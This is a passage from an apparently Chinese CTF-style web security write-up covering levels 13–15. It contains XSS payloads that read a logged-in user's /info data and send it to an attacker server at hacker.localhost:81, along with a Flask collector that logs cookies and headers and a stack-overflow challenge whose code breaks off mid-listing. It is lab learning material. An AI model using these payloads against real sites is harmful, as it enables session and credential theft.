tag"><span class="token tag"><span class="token punctuation">&lt;/</span>script</span><span class="token punctuation">></span></span>方法2：<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>script</span><span class="token punctuation">></span></span><span class="token script"><span class="token language-javascript">    <span class="token function">fetch</span><span class="token punctuation">(</span><span class="token string">'http://challenge.localhost/info'</span><span class="token punctuation">,</span> <span class="token punctuation">&#123;</span>        <span class="token literal-property property">method</span><span class="token operator">:</span> <span class="token string">'GET'</span><span class="token punctuation">,</span>        <span class="token literal-property property">credentials</span><span class="token operator">:</span> <span class="token string">'include'</span>    <span class="token punctuation">&#125;</span><span class="token punctuation">)</span>    <span class="token punctuation">.</span><span class="token function">then</span><span class="token punctuation">(</span><span class="token parameter">response</span> <span class="token operator">=></span> <span class="token punctuation">&#123;</span>        <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token operator">!</span>response<span class="token punctuation">.</span>ok<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>            <span class="token keyword">throw</span> <span class="token keyword">new</span> <span class="token class-name">Error</span><span class="token punctuation">(</span><span class="token string">'Network response was not ok'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token punctuation">&#125;</span>        <span class="token keyword">return</span> response<span class="token punctuation">.</span><span class="token function">text</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span><span class="token punctuation">)</span>    <span class="token punctuation">.</span><span class="token function">then</span><span class="token punctuation">(</span><span class="token parameter">data</span> <span class="token operator">=></span> <span class="token punctuation">&#123;</span>        console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span><span class="token string">'Info response:'</span><span class="token punctuation">,</span> data<span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token keyword">return</span> <span class="token function">fetch</span><span class="token punctuation">(</span><span class="token string">'http://hacker.localhost:81'</span><span class="token punctuation">,</span> <span class="token punctuation">&#123;</span>            <span class="token literal-property property">method</span><span class="token operator">:</span> <span class="token string">'GET'</span><span class="token punctuation">,</span>            <span class="token literal-property property">credentials</span><span class="token operator">:</span> <span class="token string">'include'</span><span class="token punctuation">,</span>            <span class="token literal-property property">headers</span><span class="token operator">:</span> <span class="token punctuation">&#123;</span>                <span class="token string-property property">"Authorization"</span><span class="token operator">:</span> data            <span class="token punctuation">&#125;</span><span class="token punctuation">,</span>        <span class="token punctuation">&#125;</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span><span class="token punctuation">)</span></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>script</span><span class="token punctuation">></span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>两种方式的hacker都是相同的</p><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">from</span> flask <span class="token keyword">import</span> Flask<span class="token punctuation">,</span> redirect<span class="token punctuation">,</span> request<span class="token punctuation">,</span> session<span class="token punctuation">,</span> render_template<span class="token punctuation">,</span> make_response<span class="token keyword">import</span> requests<span class="token keyword">import</span> http<span class="token punctuation">.</span>clientapp <span class="token operator">=</span> Flask<span class="token punctuation">(</span>__name__<span class="token punctuation">)</span><span class="token keyword">def</span> <span class="token function">add_cors_headers</span><span class="token punctuation">(</span>response<span class="token punctuation">)</span><span class="token punctuation">:</span>    response<span class="token punctuation">.</span>headers<span class="token punctuation">[</span><span class="token string">'Access-Control-Allow-Origin'</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token string">'http://challenge.localhost'</span>  <span class="token comment"># 指定允许的来源</span>    response<span class="token punctuation">.</span>headers<span class="token punctuation">[</span><span class="token string">'Access-Control-Allow-Methods'</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token string">'GET, POST, OPTIONS'</span>    response<span class="token punctuation">.</span>headers<span class="token punctuation">[</span><span class="token string">'Access-Control-Allow-Headers'</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token string">'Content-Type, Authorization'</span> <span class="token comment"># 注意这里的请求头！</span>    response<span class="token punctuation">.</span>headers<span class="token punctuation">[</span><span class="token string">'Access-Control-Allow-Credentials'</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token string">'true'</span>  <span class="token comment"># 允许发送凭证</span>    <span class="token keyword">return</span> response<span class="token decorator annotation punctuation">@app<span class="token punctuation">.</span>after_request</span><span class="token keyword">def</span> <span class="token function">after_request</span><span class="token punctuation">(</span>response<span class="token punctuation">)</span><span class="token punctuation">:</span>    <span class="token keyword">return</span> add_cors_headers<span class="token punctuation">(</span>response<span class="token punctuation">)</span><span class="token decorator annotation punctuation">@app<span class="token punctuation">.</span>route</span><span class="token punctuation">(</span><span class="token string">'/'</span><span class="token punctuation">,</span> methods<span class="token operator">=</span><span class="token punctuation">[</span><span class="token string">'GET'</span><span class="token punctuation">,</span> <span class="token string">'POST'</span><span class="token punctuation">,</span> <span class="token string">'OPTIONS'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token keyword">def</span> <span class="token function">index</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>    <span class="token keyword">if</span> request<span class="token punctuation">.</span>method <span class="token operator">==</span> <span class="token string">'OPTIONS'</span><span class="token punctuation">:</span>        <span class="token comment"># 处理预检请求</span>        response <span class="token operator">=</span> make_response<span class="token punctuation">(</span><span class="token punctuation">)</span>        <span class="token keyword">return</span> add_cors_headers<span class="token punctuation">(</span>response<span class="token punctuation">)</span>        <span class="token keyword">if</span> request<span class="token punctuation">.</span>method <span class="token operator">==</span> <span class="token string">'POST'</span> <span class="token keyword">or</span> request<span class="token punctuation">.</span>method <span class="token operator">==</span> <span class="token string">'GET'</span><span class="token punctuation">:</span>        <span class="token comment"># 打印所有请求头</span>        headers <span class="token operator">=</span> request<span class="token punctuation">.</span>headers        <span class="token keyword">for</span> header<span class="token punctuation">,</span> value <span class="token keyword">in</span> headers<span class="token punctuation">.</span>items<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>            <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string-interpolation"><span class="token string">f'</span><span class="token interpolation"><span class="token punctuation">&#123;</span>header<span class="token punctuation">&#125;</span></span><span class="token string">: </span><span class="token interpolation"><span class="token punctuation">&#123;</span>value<span class="token punctuation">&#125;</span></span><span class="token string">'</span></span><span class="token punctuation">)</span>                <span class="token comment"># 获取并打印所有 Cookie</span>        cookies <span class="token operator">=</span> request<span class="token punctuation">.</span>cookies        <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string-interpolation"><span class="token string">f"cookie:</span><span class="token interpolation"><span class="token punctuation">&#123;</span>cookies<span class="token punctuation">&#125;</span></span><span class="token string">"</span></span><span class="token punctuation">)</span>        <span class="token keyword">for</span> cookie<span class="token punctuation">,</span> value <span class="token keyword">in</span> cookies<span class="token punctuation">.</span>items<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>            <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string-interpolation"><span class="token string">f'</span><span class="token interpolation"><span class="token punctuation">&#123;</span>cookie<span class="token punctuation">&#125;</span></span><span class="token string">: </span><span class="token interpolation"><span class="token punctuation">&#123;</span>value<span class="token punctuation">&#125;</span></span><span class="token string">'</span></span><span class="token punctuation">)</span>                response <span class="token operator">=</span> make_response<span class="token punctuation">(</span><span class="token punctuation">)</span>        <span class="token keyword">return</span> add_cors_headers<span class="token punctuation">(</span>response<span class="token punctuation">)</span>    <span class="token keyword">else</span><span class="token punctuation">:</span>        response <span class="token operator">=</span> make_response<span class="token punctuation">(</span><span class="token string">"Unsupported method"</span><span class="token punctuation">)</span>        <span class="token keyword">return</span> add_cors_headers<span class="token punctuation">(</span>response<span class="token punctuation">)</span><span class="token keyword">if</span> __name__ <span class="token operator">==</span> <span class="token string">'__main__'</span><span class="token punctuation">:</span>    app<span class="token punctuation">.</span>secret_key <span class="token operator">=</span> <span class="token string">"test"</span>    app<span class="token punctuation">.</span>run<span class="token punctuation">(</span>host<span class="token operator">=</span><span class="token string">"hacker.localhost"</span><span class="token punctuation">,</span> port<span class="token operator">=</span><span class="token number">81</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>发送请求：</p><pre class="line-numbers language-python" data-language="python"><code class="language-python">echo <span class="token operator">=</span> <span class="token string">"%3Cscript%3E%20%20%20%20%20fetch('http%3A%2F%2Fchallenge.localhost%2Finfo'%2C%20%7B%20%20%20%20%20%20%20%20%20method%3A%20'GET'%2C%20%20%20%20%20%20%20%20%20credentials%3A%20'include'%20%20%20%20%20%7D)%20%20%20%20%20.then(response%20%3D%3E%20%7B%20%20%20%20%20%20%20%20%20if%20(!response.ok)%20%7B%20%20%20%20%20%20%20%20%20%20%20%20%20throw%20new%20Error('Network%20response%20was%20not%20ok')%3B%20%20%20%20%20%20%20%20%20%7D%20%20%20%20%20%20%20%20%20return%20response.text()%3B%20%20%20%20%20%7D)%20%20%20%20%20.then(data%20%3D%3E%20%7B%20%20%20%20%20%20%20%20%20console.log('Info%20response%3A'%2C%20data)%3B%20%20%20%20%20%20%20%20%20return%20fetch('http%3A%2F%2Fhacker.localhost%3A81'%2C%20%7B%20%20%20%20%20%20%20%20%20%20%20%20%20method%3A%20'GET'%2C%20%20%20%20%20%20%20%20%20%20%20%20%20credentials%3A%20'include'%2C%20%20%20%20%20%20%20%20%20%20%20%20%20headers%3A%20%7B%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%22Authorization%22%3A%20data%20%20%20%20%20%20%20%20%20%20%20%20%20%7D%2C%20%20%20%20%20%20%20%20%20%7D)%3B%20%20%20%20%20%7D)%20%20%20%20%20.then(response%20%3D%3E%20%7B%20%20%20%20%20%20%20%20%20if%20(!response.ok)%20%7B%20%20%20%20%20%20%20%20%20%20%20%20%20throw%20new%20Error('Network%20response%20was%20not%20ok')%3B%20%20%20%20%20%20%20%20%20%7D%20%20%20%20%20%20%20%20%20return%20response.json()%3B%20%20%20%20%20%7D)%20%20%20%20%20.then(data%20%3D%3E%20%7B%20%20%20%20%20%20%20%20%20console.log('Post%20response%3A'%2C%20data)%3B%20%20%20%20%20%7D)%20%20%20%20%20.catch(error%20%3D%3E%20%7B%20%20%20%20%20%20%20%20%20console.error('Error%3A'%2C%20error)%3B%20%20%20%20%20%7D)%3B%20%3C%2Fscript%3E"</span>response <span class="token operator">=</span> requests<span class="token punctuation">.</span>get<span class="token punctuation">(</span><span class="token string-interpolation"><span class="token string">f'http://challenge.localhost/visit?url=http://challenge.localhost/echo?echo=</span><span class="token interpolation"><span class="token punctuation">&#123;</span>echo<span class="token punctuation">&#125;</span></span><span class="token string">'</span></span><span class="token punctuation">)</span><span class="token keyword">print</span><span class="token punctuation">(</span>response<span class="token punctuation">.</span>text<span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><h2 id="level14"><a href="#level14" class="headerlink" title="level14"></a>level14</h2><p>在上一关中，第二种方法就是这一关的解决方案。不需要获取到cookie，直接让浏览器请求info接口，然后将响应附加在自定义头中传递给hacker服务器就行。</p><p><img src="https://laboratory-1304292449.cos.ap-nanjing.myqcloud.com/note/20240708105333.png" alt="20240708105333"></p><p>源码：</p><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">def</span> <span class="token function">level14</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>    db<span class="token punctuation">.</span>execute<span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token string">"CREATE TABLE IF NOT EXISTS users AS "</span>                <span class="token string">'SELECT "flag" AS username, ? as password'</span><span class="token punctuation">)</span><span class="token punctuation">,</span>               <span class="token punctuation">(</span>flag<span class="token punctuation">,</span><span class="token punctuation">)</span><span class="token punctuation">)</span>    <span class="token keyword">if</span> request<span class="token punctuation">.</span>path <span class="token operator">==</span> <span class="token string">"/login"</span><span class="token punctuation">:</span>        <span class="token keyword">if</span> request<span class="token punctuation">.</span>method <span class="token operator">==</span> <span class="token string">"POST"</span><span class="token punctuation">:</span>            username <span class="token operator">=</span> request<span class="token punctuation">.</span>form<span class="token punctuation">.</span>get<span class="token punctuation">(</span><span class="token string">"username"</span><span class="token punctuation">)</span>            password <span class="token operator">=</span> request<span class="token punctuation">.</span>form<span class="token punctuation">.</span>get<span class="token punctuation">(</span><span class="token string">"password"</span><span class="token punctuation">)</span>            <span class="token keyword">assert</span> username<span class="token punctuation">,</span> <span class="token string">"Missing `username` form"</span>            <span class="token keyword">assert</span> password<span class="token punctuation">,</span> <span class="token string">"Missing `password` form"</span>            user <span class="token operator">=</span> db<span class="token punctuation">.</span>execute<span class="token punctuation">(</span><span class="token string-interpolation"><span class="token string">f"SELECT rowid, * FROM users WHERE username = ? AND password = ?"</span></span><span class="token punctuation">,</span> <span class="token punctuation">(</span>username<span class="token punctuation">,</span> password<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">.</span>fetchone<span class="token punctuation">(</span><span class="token punctuation">)</span>            <span class="token keyword">assert</span> user<span class="token punctuation">,</span> <span class="token string">"Invalid `username` or `password`"</span>            session<span class="token punctuation">[</span><span class="token string">"user"</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token builtin">int</span><span class="token punctuation">(</span>user<span class="token punctuation">[</span><span class="token string">"rowid"</span><span class="token punctuation">]</span><span class="token punctuation">)</span>            <span class="token keyword">return</span> redirect<span class="token punctuation">(</span>request<span class="token punctuation">.</span>path<span class="token punctuation">)</span>        <span class="token keyword">return</span> form<span class="token punctuation">(</span><span class="token punctuation">[</span><span class="token string">"username"</span><span class="token punctuation">,</span> <span class="token string">"password"</span><span class="token punctuation">]</span><span class="token punctuation">)</span>    <span class="token keyword">if</span> request<span class="token punctuation">.</span>path <span class="token operator">==</span> <span class="token string">"/info"</span><span class="token punctuation">:</span>        session_user_id <span class="token operator">=</span> <span class="token builtin">int</span><span class="token punctuation">(</span>session<span class="token punctuation">.</span>get<span class="token punctuation">(</span><span class="token string">"user"</span><span class="token punctuation">,</span> <span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">)</span>        session_user <span class="token operator">=</span> db<span class="token punctuation">.</span>execute<span class="token punctuation">(</span><span class="token string">"SELECT * FROM users WHERE rowid = ?"</span><span class="token punctuation">,</span> <span class="token punctuation">(</span>session_user_id<span class="token punctuation">,</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">.</span>fetchone<span class="token punctuation">(</span><span class="token punctuation">)</span>        request_user_id <span class="token operator">=</span> <span class="token builtin">int</span><span class="token punctuation">(</span>request<span class="token punctuation">.</span>args<span class="token punctuation">.</span>get<span class="token punctuation">(</span><span class="token string">"user"</span><span class="token punctuation">,</span> session_user_id<span class="token punctuation">)</span><span class="token punctuation">)</span>        request_user <span class="token operator">=</span> db<span class="token punctuation">.</span>execute<span class="token punctuation">(</span><span class="token string">"SELECT * FROM users WHERE rowid = ?"</span><span class="token punctuation">,</span> <span class="token punctuation">(</span>request_user_id<span class="token punctuation">,</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">.</span>fetchone<span class="token punctuation">(</span><span class="token punctuation">)</span>        <span class="token keyword">assert</span> request_user<span class="token punctuation">,</span> <span class="token string">"Invalid `user`"</span>        info <span class="token operator">=</span> <span class="token punctuation">[</span>request_user<span class="token punctuation">[</span><span class="token string">"username"</span><span class="token punctuation">]</span><span class="token punctuation">]</span>        <span class="token keyword">if</span> request_user_id <span class="token operator">==</span> session_user_id<span class="token punctuation">:</span>            info<span class="token punctuation">.</span>append<span class="token punctuation">(</span>request_user<span class="token punctuation">[</span><span class="token string">"password"</span><span class="token punctuation">]</span><span class="token punctuation">)</span>        <span class="token keyword">return</span> <span class="token string">" "</span><span class="token punctuation">.</span>join<span class="token punctuation">(</span>info<span class="token punctuation">)</span> <span class="token operator">+</span> <span class="token string">"\n"</span>    <span class="token keyword">if</span> request<span class="token punctuation">.</span>path <span class="token operator">==</span> <span class="token string">"/visit"</span><span class="token punctuation">:</span>        url <span class="token operator">=</span> request<span class="token punctuation">.</span>args<span class="token punctuation">.</span>get<span class="token punctuation">(</span><span class="token string">"url"</span><span class="token punctuation">)</span>        <span class="token keyword">assert</span> url<span class="token punctuation">,</span> <span class="token string">"Missing `url` argument"</span>        url_arg_parsed <span class="token operator">=</span> urllib<span class="token punctuation">.</span>parse<span class="token punctuation">.</span>urlparse<span class="token punctuation">(</span>url<span class="token punctuation">)</span>        <span class="token keyword">assert</span> url_arg_parsed<span class="token punctuation">.</span>hostname <span class="token operator">==</span> challenge_host<span class="token punctuation">,</span> <span class="token string-interpolation"><span class="token string">f"Invalid `url`, hostname should be `</span><span class="token interpolation"><span class="token punctuation">&#123;</span>challenge_host<span class="token punctuation">&#125;</span></span><span class="token string">`"</span></span>        <span class="token keyword">with</span> run_browser<span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token keyword">as</span> browser<span class="token punctuation">:</span>            browser<span class="token punctuation">.</span>get<span class="token punctuation">(</span><span class="token string-interpolation"><span class="token string">f"http://</span><span class="token interpolation"><span class="token punctuation">&#123;</span>challenge_host<span class="token punctuation">&#125;</span></span><span class="token string">/login"</span></span><span class="token punctuation">)</span>            user_form <span class="token operator">=</span> <span class="token punctuation">&#123;</span>                <span class="token string">"username"</span><span class="token punctuation">:</span> <span class="token string">"flag"</span><span class="token punctuation">,</span>                <span class="token string">"password"</span><span class="token punctuation">:</span> flag<span class="token punctuation">,</span>            <span class="token punctuation">&#125;</span>            <span class="token keyword">for</span> name<span class="token punctuation">,</span> value <span class="token keyword">in</span> user_form<span class="token punctuation">.</span>items<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>                field <span class="token operator">=</span> browser<span class="token punctuation">.</span>find_element<span class="token punctuation">(</span>By<span class="token punctuation">.</span>NAME<span class="token punctuation">,</span> name<span class="token punctuation">)</span>                field<span class="token punctuation">.</span>send_keys<span class="token punctuation">(</span>value<span class="token punctuation">)</span>            submit_field <span class="token operator">=</span> browser<span class="token punctuation">.</span>find_element<span class="token punctuation">(</span>By<span class="token punctuation">.</span>ID<span class="token punctuation">,</span> <span class="token string">"submit"</span><span class="token punctuation">)</span>            submit_field<span class="token punctuation">.</span>submit<span class="token punctuation">(</span><span class="token punctuation">)</span>            WebDriverWait<span class="token punctuation">(</span>browser<span class="token punctuation">,</span> <span class="token number">10</span><span class="token punctuation">)</span><span class="token punctuation">.</span>until<span class="token punctuation">(</span>EC<span class="token punctuation">.</span>staleness_of<span class="token punctuation">(</span>submit_field<span class="token punctuation">)</span><span class="token punctuation">)</span>            browser<span class="token punctuation">.</span>get<span class="token punctuation">(</span>url<span class="token punctuation">)</span>            time<span class="token punctuation">.</span>sleep<span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">)</span>        <span class="token keyword">return</span> <span class="token string">"Visited\n"</span>    <span class="token keyword">if</span> request<span class="token punctuation">.</span>path <span class="token operator">==</span> <span class="token string">"/echo"</span><span class="token punctuation">:</span>        echo <span class="token operator">=</span> request<span class="token punctuation">.</span>args<span class="token punctuation">.</span>get<span class="token punctuation">(</span><span class="token string">"echo"</span><span class="token punctuation">)</span>        <span class="token keyword">assert</span> echo<span class="token punctuation">,</span> <span class="token string">"Missing `echo` argument"</span>        <span class="token keyword">return</span> html<span class="token punctuation">(</span>echo<span class="token punctuation">)</span>    <span class="token keyword">return</span> <span class="token string">"Not Found\n"</span><span class="token punctuation">,</span> <span class="token number">404</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>利用html代码</p><pre class="line-numbers language-markup" data-language="markup"><code class="language-markup"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>script</span><span class="token punctuation">></span></span><span class="token script"><span class="token language-javascript">    <span class="token function">fetch</span><span class="token punctuation">(</span><span class="token string">'http://challenge.localhost/info'</span><span class="token punctuation">,</span> <span class="token punctuation">&#123;</span>        <span class="token literal-property property">method</span><span class="token operator">:</span> <span class="token string">'GET'</span><span class="token punctuation">,</span>        <span class="token literal-property property">credentials</span><span class="token operator">:</span> <span class="token string">'include'</span>    <span class="token punctuation">&#125;</span><span class="token punctuation">)</span>    <span class="token punctuation">.</span><span class="token function">then</span><span class="token punctuation">(</span><span class="token parameter">response</span> <span class="token operator">=></span> <span class="token punctuation">&#123;</span>        <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token operator">!</span>response<span class="token punctuation">.</span>ok<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>            <span class="token keyword">throw</span> <span class="token keyword">new</span> <span class="token class-name">Error</span><span class="token punctuation">(</span><span class="token string">'Network response was not ok'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token punctuation">&#125;</span>        <span class="token keyword">return</span> response<span class="token punctuation">.</span><span class="token function">text</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span><span class="token punctuation">)</span>    <span class="token punctuation">.</span><span class="token function">then</span><span class="token punctuation">(</span><span class="token parameter">data</span> <span class="token operator">=></span> <span class="token punctuation">&#123;</span>        console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span><span class="token string">'Info response:'</span><span class="token punctuation">,</span> data<span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token keyword">return</span> <span class="token function">fetch</span><span class="token punctuation">(</span><span class="token string">'http://hacker.localhost:81'</span><span class="token punctuation">,</span> <span class="token punctuation">&#123;</span>            <span class="token literal-property property">method</span><span class="token operator">:</span> <span class="token string">'GET'</span><span class="token punctuation">,</span>            <span class="token literal-property property">credentials</span><span class="token operator">:</span> <span class="token string">'include'</span><span class="token punctuation">,</span>            <span class="token literal-property property">headers</span><span class="token operator">:</span> <span class="token punctuation">&#123;</span>                <span class="token string-property property">"Authorization"</span><span class="token operator">:</span> data            <span class="token punctuation">&#125;</span><span class="token punctuation">,</span>        <span class="token punctuation">&#125;</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span><span class="token punctuation">)</span>    <span class="token punctuation">.</span><span class="token function">then</span><span class="token punctuation">(</span><span class="token parameter">response</span> <span class="token operator">=></span> <span class="token punctuation">&#123;</span>        <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token operator">!</span>response<span class="token punctuation">.</span>ok<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>            <span class="token keyword">throw</span> <span class="token keyword">new</span> <span class="token class-name">Error</span><span class="token punctuation">(</span><span class="token string">'Network response was not ok'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token punctuation">&#125;</span>        <span class="token keyword">return</span> response<span class="token punctuation">.</span><span class="token function">json</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span><span class="token punctuation">)</span>    <span class="token punctuation">.</span><span class="token function">then</span><span class="token punctuation">(</span><span class="token parameter">data</span> <span class="token operator">=></span> <span class="token punctuation">&#123;</span>        console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span><span class="token string">'Post response:'</span><span class="token punctuation">,</span> data<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span><span class="token punctuation">)</span>    <span class="token punctuation">.</span><span class="token function">catch</span><span class="token punctuation">(</span><span class="token parameter">error</span> <span class="token operator">=></span> <span class="token punctuation">&#123;</span>        console<span class="token punctuation">.</span><span class="token function">error</span><span class="token punctuation">(</span><span class="token string">'Error:'</span><span class="token punctuation">,</span> error<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span><span class="token punctuation">)</span><span class="token punctuation">;</span></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>script</span><span class="token punctuation">></span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h2 id="level15"><a href="#level15" class="headerlink" title="level15"></a>level15</h2><p>这个就是栈溢出，用win_address的地址覆盖掉greet函数的返回地址，就能显示flag了。</p><p>然后就是注意编码的问题</p><p>源码</p><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">def</span> <span class="token function">level15</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>    <span class="token keyword">if</span> <span class="token string">"libgreet"</span> <span class="token keyword">not</span> <span class="token keyword">in</span> <span class="token builtin">globals</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>        <span class="token keyword">global</span> libgreet        shared_library_file <span class="token operator">=</span> tempfile<span class="token punctuation">.</span>NamedTemporaryFile<span class="token punctuation">(</span><span class="token string">"x"</span><span class="token punctuation">,</span> suffix<span class="token operator">=</span><span class="token string">".so"</span><span class="token punctuation">)</span>        gcc_args <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token string">"/usr/bin/gcc"</span><span class="token punctuation">,</span> <span class="token string">"-x"</span><span class="token punctuation">,</span> <span class="token string">"c"</span><span class="token punctuation">,</span> <span class="token string">"-shared"</span><span class="token punctuation">,</span> <span class="token string">"-fPIC"</span><span class="token punctuation">,</span> <span class="token string">"-fno-stack-protector"</span><span class="token punctuation">,</span> <span class="token string">"-o"</span><span class="token punctuation">,</span> shared_library_file<span class="token punctuation">.</span>name<span class="token punctuation">,</span> <span class="token string">"-"</span><span class="token punctuation">]</span>        subprocess<span class="token punctuation">.</span>run<span class="token punctuation">(</span>gcc_args<span class="token punctuation">,</span> <span class="token builtin">input</span><span class="token operator">=</span><span class="token triple-quoted-string string">r"""        #include &lt;unistd.h>        #include &lt;fcntl.h>        #include &lt;stdio.h>        #include &lt;string.h>        void __attribute__ ((constructor)) disable_buffering(void) &#123;          setvbuf(stdout, NULL, _IONBF, 0);        &#125;        void win(void)        &#123;          char flag[256] = &#123; 0 &#125;;          int flag_fd;          puts("You win! Here is your flag:");          flag_fd = open("/flag", 0);          read(flag_fd, flag, sizeof(flag));          puts(flag);        &#125;        void * win_address(void)        &#123;          return win;        &#125;        void greet(char *name, size_t length)        &#123;          char buffer[256] = &#123; 0 &#125;;          memcpy(buffer, "Hello, ", 7);          memcpy(buffer + 7, name, length);          memcpy(buffer + 7 + length, "!", 1);          puts(buffer);        &#125;        """</span><span class="token punctuation">.</span>encode<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span>        libgreet <span class="token operator">=</span> ctypes<span class="token punctuation">.</span>CDLL<span class="token punctuation">(</span>shared_library_file<span class="token punctuation">.</span>name<span class="token punctuation">)</span>        libgreet<span class="token punctuation">.</span>win_address<span class="token punctuation">.</span>restype <span class="token operator">=</span> ctypes<span class="token punctuation">.</span>c_void_p    <span class="token keyword">if</span> request<span class="token punctuation">.</span>path <span class="token operator">==</span> <span class="token string">"/win_address"</span><span class="token punctuation">:</span>        <span class="token keyword">return</span> <span class="token string-interpolation"><span class="token string">f"</span><span class="token interpolation"><span class="token punctuation">&#123;</span><span class="token builtin">hex</span><span class="token punctuation">(</span>libgreet<span class="token punctuation">.</span>win_address<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">&#125;</span></span><span class="token string">\n"</span></span>    <span class="token keyword">if</span> request<span class="token punctuation">.</span>path <span class="token operator">==</span> <span class="token string">"/greet"</span><span class="token punctuation">:</span>        name <span class="token operator">=</span> request<span class="token punctuation">.</span>args<span class="token punctuation">.</span>get<span class="token punctuation">(</span><span class="token string">"name"</span><span class="token punctuation">)</span>        <span class="token keyword">assert</span> name<span class="token punctuation">,</span> <span class="token string">"Missing `name` argument"</span>        <span class="token keyword">def</span> <span class="token function">stream_greet</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>            r<span class="token punctuation">,</span> w <span class="token operator">=</span> os<span class="token punctuation">.</span>pipe<span class="token punctuation">(</span><span class="token punctuation">)</span>            pid <span class="token operator">=</span> os<span class="token punctuation">.</span>fork<span class="token punctuation">(</span><span class="token punctuation">)</span>            <span class="token keyword">if</span> pid <span class="token operator">==</span> <span class="token number">0</span><span class="token punctuation">:</span>                os<span class="token punctuation">.</span>close<span class="token punctuation">(</span>r<span class="token punctuation">)</span>                os<span class="token punctuation">.</span>dup2<span class="token punctuation">(</span>w<span class="token punctuation">,</span> <span class="token 